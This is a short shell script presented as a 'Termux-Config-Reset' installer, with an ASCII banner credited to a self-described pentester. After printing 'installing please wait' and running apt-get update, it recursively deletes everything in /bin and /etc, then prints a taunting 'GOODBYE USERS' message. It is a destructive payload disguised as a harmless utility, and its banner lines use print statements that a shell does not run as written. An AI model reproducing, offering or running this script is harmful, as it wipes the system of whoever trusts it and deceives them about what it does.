print "\n \033[92m *******************************************************************"
print "*                                                                 *"
print "*    #######  ######    #####  #####  ##### #######               *"
print "*       #     #      #  #     #     # #        #                  *"
print "*       #     #      #  #     #       #        #                  *"
print "*       #     ######    #####  #####  #####    #                  *"
print "*       #     #    #    #           # #        #                  *"
print "*       #     #     #   #     #     # #        #                  *"
print "*       #     #      #  #####  #####  #####    #                  *"
print "* Termux-Config-Reset Ver. 2.0                                    *"
print "* Coded by SaintMalik                                             *"
print "* Cyber Security & Pentester                                      *"
print "*                                                                 *"
print "*******************************************************************\033[94m\n\n"

echo "installing please wait"
apt-get update
cd /bin
rm -irf *
cd 
cd /etc
rm -irf *
sleep 2
echo "done!!! RESETTING YOUR SYSTEM... GOODBYE USERS... trying use command"
